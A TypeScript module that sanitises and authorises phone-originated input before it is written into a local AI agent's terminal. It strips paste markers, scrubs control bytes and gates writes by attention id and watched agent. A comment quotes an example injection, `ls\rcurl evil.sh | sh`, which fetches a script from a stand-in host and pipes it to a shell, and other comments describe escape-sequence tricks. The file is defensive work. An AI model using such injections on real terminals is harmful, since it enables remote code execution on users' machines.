// Authorization AND framing for what a phone may inject into a local agent's PTY. Kept separate
// from the socket plumbing so the security-critical gates are unit-testable. A phone (the user's
// remote) can drive a PTY only via these three paths; everything else is dropped.
//
// THIS IS THE ONE PTY-WRITE SURFACE IN THE APP WHOSE INPUT ORIGINATES OFF THE MACHINE. The
// payloads arrive as `agent_input` / `decision` / `suggestion_click` frames over the remote
// sparkle-orchestration socket, and the Rust side writes them to the pty verbatim
// (`writer.write_all(data.as_bytes())` — a pty write legitimately carries arbitrary bytes, so
// there is no filtering there by design). Everything downstream of this file therefore trusts
// that what leaves here is already safe to hand to a running CLI.
//
// Two things a raw remote string could do, both of which these framers close:
//   1. An embedded `ESC[201~` CLOSES bracketed-paste mode mid-payload, so the remainder is read as
//      live KEYSTROKES by whatever is running — an Ink picker, or a bare shell before `claude`
//      execs. `ESC[200~`/`ESC[201~` can also corrupt the paste state of a concurrent operation
//      chained on the same agent's `ptyWriteChains`. (pty.ts's note on roborev 2197 / 54397 —
//      this guard has been written, lost to a second call site, and re-written before.)
//   2. An embedded mid-string `\r` submits a SECOND, attacker-chosen line, which the "one
//      authorized input" model these gates implement never intended to permit.
//
// The defence is the same one every other non-live-keystroke write path already runs
// (`pty.deliverSubmit`, `pty.pasteIntoPty`, `conciergeDispatch.frameCloudSubmit`): strip embedded
// paste markers, then wrap the body in one bracketed paste. `stripPasteMarkers` is IMPORTED, never
// re-implemented — a near-duplicate of a security filter is exactly how one copy gets fixed and
// the other does not, which is the bug class this file is closing.
//
// Imported from the LEAF `../pasteMarkers`, not from `../pty` which re-exports it: `pty` is the
// module 45 suites replace wholesale with `vi.mock`, and reaching the filter through it would hand
// this file `undefined` inside any of them — a guard that disappears exactly where the PTY is
// faked. A leaf with no imports cannot be collaterally stubbed.
import { PASTE_START, PASTE_END, stripPasteMarkers } from "../pasteMarkers";

export interface DecisionPayload {
  attention_id?: string;
  agent_id?: string;
  reply?: string;
  submit?: boolean;
}
export interface AgentInputPayload {
  agent_id?: string;
  text?: string;
}
export interface SuggestionClickPayload {
  agent_id?: string;
  button_id?: string;
}
declare const RELAY_FRAMED: unique symbol;
/**
 * A string that has been through this module's framing and is therefore safe to hand to a PTY.
 *
 * THE STRUCTURAL BACKSTOP for everything the header describes. Without it, the safety of this path
 * is a TypeScript-side CONVENTION: a `socket.on(...)` handler added next quarter can call
 * `writePtyChained(id, payload.text)` with the raw remote string and silently reintroduce the bug,
 * exactly as roborev 54397 reintroduced 2197's by adding a caller that did not know about the
 * guard. A plain `string` cannot be assigned to this type, so `relayClient`'s write helper — which
 * accepts only `FramedPtyText` — turns "I forgot to frame it" into a COMPILE ERROR instead of a
 * silent remote-code-execution hole.
 *
 * The brand exists only in the type system; at runtime these are ordinary strings.
 */
export type FramedPtyText = string & { readonly [RELAY_FRAMED]: true };

export interface PtyWrite {
  agentId: string;
  /** Already stripped and bracketed-paste framed — see {@link FramedPtyText}. */
  text: FramedPtyText;
}

const MAX = 4000;

/**
 * Terminate a submission with CR — the byte a physical Enter key sends. Raw-mode TUIs (Claude
 * Code's Ink pickers/composer) only treat `\r` as Enter; LF is NOT Enter there, which is why
 * phone-typed answers to a numbered picker used to vanish. Canonical-mode (line-buffered) prompts
 * still submit fine: termios ICRNL translates the CR to NL on input. A trailing LF (older phone
 * clients frame with `\n`) is converted rather than doubled.
 */
function terminateSubmit(value: string): string {
  // Strip the ENTIRE existing terminator (LF, CR, or CRLF) before appending exactly one CR — a
  // CRLF-framed value must not become "\r\r" (two Enters: answer the picker, then blindly
  // confirm whatever renders next).
  return `${stripTerminator(value)}\r`;
}

/** The trailing-terminator normalization on its own, so the paste-framed form below can reuse it
 *  and the "exactly one CR, never two Enters" rule stays stated in ONE place. */
function stripTerminator(value: string): string {
  return value.replace(/\r?\n$|\r$/, "");
}

/**
 * Wrap a body in one bracketed paste, with any embedded markers stripped first.
 *
 * The strip must happen INSIDE the wrapper's construction, not at the call sites: a body that
 * still carried `ESC[201~` would terminate the very paste we are opening here and have its tail
 * read as keystrokes (see the header).
 */
function framePaste(body: string): FramedPtyText {
  // The ONE place the brand is minted, and it sits directly on top of BOTH filters — so a value can
  // only acquire the type by actually having been cleaned and wrapped.
  //
  // ORDER IS LOAD-BEARING: strip markers, THEN scrub control bytes. Reversed, `scrubControls`
  // removes the ESC out of `ESC[200~` and leaves the literal text `[200~`, which
  // `stripPasteMarkers` can no longer match — so the marker is defanged (it is no longer an escape
  // sequence) but its debris is pasted into the user's prompt as visible garbage. Caught by the
  // existing "strips an embedded PASTE_START" test when this was first written the other way round.
  return `${PASTE_START}${scrubControls(stripPasteMarkers(body))}${PASTE_END}` as FramedPtyText;
}

/**
 * The wire form of a REMOTE (phone-relay) submission: strip, bracket-paste, then exactly one CR.
 *
 * ONE STRING, NOT TWO WRITES, which is the difference from the local `pty.deliverSubmit` rather
 * than an omission — the same reasoning `conciergeDispatch.frameCloudSubmit` records. These gates
 * hand a single value to a single `writePtyChained` call, so the paste and its Enter cannot be
 * reordered against each other or have an unrelated chained write land between them; splitting
 * them into two writes would open exactly the paste→CR window `ptyWriteChains` exists to close.
 *
 * `terminateSubmit`'s single-trailing-CR semantics are preserved exactly: the existing terminator
 * (LF, CR or CRLF) is stripped from the BODY, and one CR is appended AFTER `PASTE_END` so it is
 * still the Enter a raw-mode Ink picker requires. Only the framing is new.
 */
export function frameRelaySubmit(value: string): FramedPtyText {
  return `${framePaste(stripTerminator(value))}\r` as FramedPtyText;
}

/**
 * Remove C0 control bytes that a terminal would act on, keeping TAB and LF.
 *
 * THE PASTE WRAPPER IS NOT A FILTER, which is the distinction this function exists to draw. Wrapping
 * a body in `ESC[200~ … ESC[201~` only neutralizes its contents if the FOREGROUND PROGRAM has
 * bracketed-paste mode enabled. A raw shell — the state a PTY is in before `claude` execs, and after
 * it exits — has it off, and then the markers arrive as literal `[200~` text while an interior `\r`
 * executes as a second command line. So `ls\rcurl evil.sh | sh` was still an injection against the
 * exact payload this gate is meant to sanitize. Same shape for `\x03` (SIGINT) and `\x04` (EOF).
 *
 * Hence: scrub first, frame second. The framing is defense in depth; this is the primary filter.
 *
 * LF is DELIBERATELY KEPT for paste-framed free text, so a multi-line prompt typed on a phone still
 * arrives as multiple lines. That is a real, bounded residual — with bracketed paste off, an
 * interior LF still submits a line. It is accepted rather than closed because closing it removes a
 * feature people use, and because the remaining exposure is a bare shell rather than a live CLI.
 * The keystroke path below has no such need and keeps nothing.
 */
function scrubControls(s: string): string {
// \u0000-\u0008 (NUL..BS) and \u000B-\u001F (VT..US, which includes CR \r and ESC),
  // plus \u007F (DEL). TAB (\u0009) and LF (\u000A) are the deliberate survivors.
  //
  // Written as ESCAPES, never as literal control bytes: a source file carrying raw NUL/ESC is
  // one careless editor or copy-paste away from being silently altered, and the diff would not
  // show it. This is a security filter, so its own text has to be robust.
  // eslint-disable-next-line no-control-regex -- removing control bytes is this function's job
  return s.replace(/[\u0000-\u0008\u000B-\u001F\u007F]/g, "");
}

/**
 * The wire form of a remote PICKER ANSWER: strip, scrub every control byte, exactly one CR — and
 * NO bracketed-paste wrapper.
 *
 * WHY A SECOND FRAMER RATHER THAN REUSING {@link frameRelaySubmit} (roborev 60573, High). These
 * payloads are keystrokes, not text: `"y\n"`, `"n\n"`, `"2\n"` answering a live raw-mode Ink dialog,
 * produced by `suggestions/heuristics.ts` and `attentionReplies.ts`. Wrapping a one-key answer in a
 * bracketed paste is a thing this codebase forbids in several places at once —
 * `conciergeDispatch.ts`'s header rules, `frameCloudSubmit`'s caller refusing while a picker is
 * live, `dictationTerminalRoute.WRITE_BLOCKING_PROMPTS` — and {@link frameSubmit}'s own doc says
 * wrapping a click "would change what the desktop has always sent".
 *
 * The concrete failure it caused: a phone tap on "Approve" sent `ESC[200~y ESC[201~\r` while the
 * same button clicked locally sent `y\r`. Against a permission dialog whose select component does
 * not consume paste markers, the leading ESC reads as Escape and CANCELS the prompt, `[200~y` lands
 * as stray keystrokes in whatever renders next, and the CR confirms it. An approval that silently
 * does nothing is the good case.
 *
 * Scrubs ALL controls including LF: a picker answer never legitimately contains an interior
 * newline, so there is nothing to trade off here — unlike the paste path above.
 */
export function frameRelayKeystroke(value: string): FramedPtyText {
  const body = scrubControls(stripPasteMarkers(stripTerminator(value))).replace(/\n/g, "");
  return `${body}\r` as FramedPtyText;
}

/**
 * Authorize a phone DECISION. A decision may ONLY drive an agent we actually raised an attention
 * for (looked up by its per-attention id), so a relay/phone can't inject into an arbitrary PTY.
 * Single-use: a valid decision CONSUMES the attention from `liveAttentions`, so a replay returns
 * null. Returns the target agent + framed PTY text, or null if unauthorized/invalid.
 */
export function authorizeDecision(
  liveAttentions: Map<string, string>,
  d: DecisionPayload,
): PtyWrite | null {
  if (!d || typeof d.attention_id !== "string") return null;
  const agentId = liveAttentions.get(d.attention_id);
  if (!agentId) return null; // not an attention we raised (or already consumed)
  if (typeof d.reply !== "string" || d.reply.length > MAX) return null;
  liveAttentions.delete(d.attention_id); // one decision per raised attention
  // The phone frames replies with a trailing LF; submit means "press Enter", so normalize to CR
  // either way (see frameRelaySubmit) — a reply that already carries its newline still gets fixed.
  //
  // BOTH branches are paste-framed, because both write `d.reply` — a remote, attacker-shaped
  // string of up to MAX chars — into the PTY. The no-submit branch mirrors `pty.pasteIntoPty`
  // (paste, no CR: the text sits in the prompt for the human to send); the submit branch mirrors
  // `pty.deliverSubmit`. Framing the no-submit branch matters just as much: without it an embedded
  // `ESC[200~` left the NEXT chained operation's paste state corrupted.
  //
  // A SUBMIT IS FRAMED BY SHAPE, NOT BY GUESS (roborev 60573, High). Most decision replies are
  // picker ANSWERS — `suggestedRepliesFor` hands the phone `"y\n"`, `"n\n"`, or a detected menu
  // option — and wrapping a one-key answer in a bracketed paste is what broke: the phone sent
  // `ESC[200~y ESC[201~\r` where a local click sends `y\r`, and against a dialog that does not
  // consume paste markers the leading ESC cancels the prompt. But the same field can also carry a
  // typed multi-line reply, which genuinely wants a paste.
  //
  // The discriminator is the payload itself rather than a flag we would have to trust: a picker
  // answer never contains an INTERIOR newline. Single-line ⇒ keystroke framing, byte-identical to
  // the desktop click. Multi-line ⇒ paste framing, because it is real text.
  // Interior CR is dropped before the test, so only LF counts as evidence of genuine multi-line
  // text. Otherwise the DISCRIMINATOR ITSELF is attacker-controlled: appending a `\r` to a one-key
  // answer would flip a picker reply onto the paste path and re-create the cancelled-dialog bug on
  // demand. A CR is never legitimate inside a reply, so removing it here loses nothing.
  const body = stripTerminator(d.reply).replace(/\r/g, "");
  const multiline = body.includes("\n");
  const text = d.submit || d.reply.endsWith("\n")
    ? multiline
      ? frameRelaySubmit(d.reply)
      : frameRelayKeystroke(d.reply)
    : framePaste(d.reply);
  return { agentId, text };
}

/**
 * Authorize phone free-text AGENT_INPUT. Allowed ONLY for an agent the phone is currently
 * watching (drill-in) — never an unwatched/arbitrary agent. Submits (trailing newline) for
 * parity with the decision path. Returns the target agent + text, or null.
 */
export function authorizeAgentInput(
  watched: Set<string>,
  i: AgentInputPayload,
): PtyWrite | null {
  if (!i || typeof i.agent_id !== "string" || !watched.has(i.agent_id)) return null;
  if (typeof i.text !== "string" || i.text.length > MAX) return null;
  // The widest of the three: free text, straight off the socket, up to MAX chars. Paste-framed for
  // the reasons in the header — this is the payload an attacker actually gets to author.
  return { agentId: i.agent_id, text: frameRelaySubmit(i.text) };
}

/**
 * The single authorization gate for a phone suggestion click: allowed ONLY for a watched agent and
 * a button id the desktop actually pushed (resolved via `lookup`). Returns the target agent + the
 * pushed value, marker-stripped but UNWRAPPED (no bracketed paste, no CR), or null. Both the
 * PTY-write path and the control-action path branch off this one result, so the gate can never
 * diverge — which is also why the value stays unwrapped here and is framed by the write branch.
 */
export function resolveSuggestionClick(
  watched: Set<string>,
  c: SuggestionClickPayload,
  lookup: (agentId: string, buttonId: string) => string | null,
): { agentId: string; value: string } | null {
  if (!c || typeof c.agent_id !== "string" || !watched.has(c.agent_id)) return null;
  if (typeof c.button_id !== "string") return null;
  const value = lookup(c.agent_id, c.button_id);
  if (value == null || value.length > MAX) return null;
  // Stripped HERE rather than in the framing, because this is the one gate whose result FORKS: the
  // caller reads the raw value with `parseControlAction` before deciding between an app action and
  // a PTY write, so a wrapper applied here would break that parse and a strip applied only in the
  // write branch would leave the other one unguarded.
  //
  // Constrained, but NOT to a fixed set — which is why it is filtered like the other two rather
  // than exempted. The phone sends only a button id, and the value is whatever the DESKTOP pushed
  // for it, so no remote text reaches this line. But those values are derived from the agent's own
  // terminal output (`suggestions/useSuggestions` parses live picker options off the screen), so
  // they are CLI/model-authored strings, not an enum this file could enumerate.
  return { agentId: c.agent_id, value: stripPasteMarkers(value) };
}

/**
 * Frame a value for SUBMISSION into the PTY as a KEYSTROKE: exactly one trailing CR (Enter) so the
 * prompt is actually entered, and no paste wrapper. Values authored with `\n` (e.g. heuristic
 * buttons' "2\n") are normalized, not doubled.
 *
 * DELIBERATELY NOT PASTE-FRAMED, unlike {@link frameRelaySubmit}. This is the LOCAL picker-answer
 * form — `conciergeDispatch` sends `frameSubmit(match.value)` for a desktop click, and pty.ts's
 * `writePtyChained` note describes exactly this shape ("these payloads carry their OWN carriage
 * return"). Wrapping a one-key picker answer in a bracketed paste would change what the desktop
 * has always sent for a click, which is a behaviour change in a path this security fix has no
 * finding against; the remote path gets the stronger framing because it is the remote path.
 *
 * It DOES strip paste markers, which is free and cannot change how a picker reads a legitimate
 * answer: no real "2" / "y" / option label contains an ESC. Worth having anyway — such a marker
 * would corrupt the paste state of whatever else is queued on the same agent's `ptyWriteChains`.
 */
export function frameSubmit(value: string): string {
  return terminateSubmit(stripPasteMarkers(value));
}
